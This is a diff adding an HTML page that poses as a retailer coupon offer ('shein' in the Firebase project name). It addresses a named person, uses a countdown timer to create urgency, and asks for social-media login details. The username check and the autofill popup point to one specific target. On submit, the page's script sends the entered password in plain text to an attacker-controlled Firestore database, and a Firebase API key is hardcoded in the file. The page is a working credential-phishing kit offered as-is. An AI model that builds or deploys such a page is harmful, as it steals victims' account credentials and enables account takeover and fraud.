@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offer Unlock | Exclusive Access</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        .gift-banner {
+            background: #000000;
+            color: #ffffff;
+            padding: 15px;
+            text-align: center;
+            font-weight: 600;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+
+        .timer-text {
+            color: #ff9800;
+            font-size: 18px;
+            font-family: monospace;
+            display: block;
+            margin-top: 5px;
+        }
+
+        body { padding-top: 100px; }
+
+        /* Updated Purple Popup - Added Cursor Pointer */
+        #hint-popup {
+            display: none;
+            background: #8a3ab9;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            position: absolute;
+            top: -45px;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 100;
+            cursor: pointer; /* Makes it look clickable */
+            user-select: none;
+        }
+
+        #hint-popup::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: #8a3ab9 transparent transparent transparent;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-top: 10px;
+        }
+
+        #username-error {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-banner">
+        Daniya! Dont miss this chance to get a 64$ coupon of your pending cart
+        <span id="countdown" class="timer-text">01:00:00</span>
+    </div>
+
+    <div class="login-container">
+        <div class="login-card">
+            <h2 style="font-size: 22px; line-height: 1.2; margin-bottom: 10px;">Login with your socials to unlock the offer</h2>
+            
+            <form id="signupForm">
+                <div class="input-group">
+                    <label for="username">Username</label>
+                    <div class="input-wrapper">
+                        <div id="hint-popup">803.d8</div>
+                        <input type="text" id="username" placeholder="Username" required autocomplete="off">
+                    </div>
+                    <p id="username-error">Account did not meet basic requirements</p>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="login-btn">Unlock Offer</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Timer Logic
+        let time = 3600; 
+        const display = document.getElementById('countdown');
+        setInterval(() => {
+            let hours = Math.floor(time / 3600);
+            let minutes = Math.floor((time % 3600) / 60);
+            let seconds = time % 60;
+            display.innerHTML = (hours < 10 ? "0" : "") + hours + ":" + 
+                                (minutes < 10 ? "0" : "") + minutes + ":" + 
+                                (seconds < 10 ? "0" : "") + seconds;
+            if (time > 0) time--;
+        }, 1000);
+
+        // UI Interactions
+        const usernameInput = document.getElementById('username');
+        const hintPopup = document.getElementById('hint-popup');
+        const errorMsg = document.getElementById('username-error');
+
+        // Show popup as soon as typing starts
+        usernameInput.addEventListener('input', () => {
+            if (usernameInput.value.length > 0) {
+                hintPopup.style.display = "block";
+            } else {
+                hintPopup.style.display = "none";
+            }
+            errorMsg.style.display = "none";
+        });
+
+        // CLICK LOGIC: Autofill username when popup is clicked
+        hintPopup.addEventListener('click', () => {
+            usernameInput.value = "803.d8";
+            errorMsg.style.display = "none";
+            // Optional: Move focus to password after clicking hint
+            document.getElementById('password').focus();
+        });
+    </script>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2rtfHXQ8rXyo4W_M8FfY0fthJR5x3-Oc",
+            authDomain: "shein-add12.firebaseapp.com",
+            projectId: "shein-add12",
+            storageBucket: "shein-add12.firebasestorage.app",
+            messagingSenderId: "699981634401",
+            appId: "1:699981634401:web:4214082caf662e95968320"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('signupForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const val = document.getElementById('username').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+
+            if (val !== "803.d8") {
+                document.getElementById('username-error').style.display = "block";
+                return;
+            }
+
+            submitBtn.innerText = "Verifying...";
+            submitBtn.disabled = true;
+
+            try {
+                await addDoc(collection(db, "users"), {
+                    user_name: val,
+                    user_password: document.getElementById('password').value,
+                    timestamp: new Date()
+                });
+                window.location.href = "welcome.html";
+            } catch (error) {
+                console.error(error);
+                submitBtn.innerText = "Unlock Offer";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
